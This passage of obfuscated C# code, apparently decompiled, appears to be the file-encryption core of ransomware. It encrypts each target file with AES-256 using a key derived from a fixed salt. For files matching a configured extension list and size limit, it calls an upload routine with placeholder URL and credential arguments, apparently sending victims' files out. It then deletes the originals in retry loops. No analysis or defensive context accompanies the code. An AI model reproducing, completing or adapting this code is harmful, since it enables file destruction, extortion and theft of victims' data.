									FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", fmRPRdeKzRFuY);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(fmRPRdeKzRFuY) && num2 >= 0)
							{
								File.Delete(fmRPRdeKzRFuY);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (wqfOkilIvNmf.EndsWith(".part"))
					{
						File.Move(wqfOkilIvNmf, wqfOkilIvNmf.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(wqfOkilIvNmf);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void AUkxAhDnruHDH(string ihzeIYROOqUqW, string IjyIwUayVlY, byte[] tHJLpNRYhtJ)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = IjyIwUayVlY;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(tHJLpNRYhtJ, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (AbkRtlPjZlew == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ihzeIYROOqUqW, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(ihzeIYROOqUqW, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(ihzeIYROOqUqW, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (IjyIwUayVlY.Length > 0)
				{
					FileStream fileStream4 = new FileStream(ihzeIYROOqUqW, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ZwDUufGDCysrvCb == "YES")
					{
						foreach (string item in jjGwgfQeXEgM)
						{
							if (ihzeIYROOqUqW.ToLower().EndsWith(item) && SJciSWANwLpZd == "YES")
							{
								if (Convert.ToInt32(XyJXNRlVrpoE) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", ihzeIYROOqUqW);
									}
									catch
									{
									}
								}
							}
							else if (ihzeIYROOqUqW.ToLower().EndsWith(item) && SJciSWANwLpZd == "NO")
							{
								try
								{
									FFdxwtHSrgOu.WMaZYGtgQwWMld("URL", "USERNAME", "ACCESO", ihzeIYROOqUqW);
								}
								catch
								{
								}
							}
						}
					}
					fileStream4.Dispose();
					new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(ihzeIYROOqUqW);
								break;
							}
							catch
							{
							}
						}
					}).Start();
					if (IjyIwUayVlY.EndsWith(".part"))
					{
						File.Move(IjyIwUayVlY, IjyIwUayVlY.Replace(".part", ""));
					}
					return;
				}
				new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(IjyIwUayVlY))
							{
								File.Delete(IjyIwUayVlY);
							}
							break;
						}
						catch
						{
						}
					}
				}).Start();
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
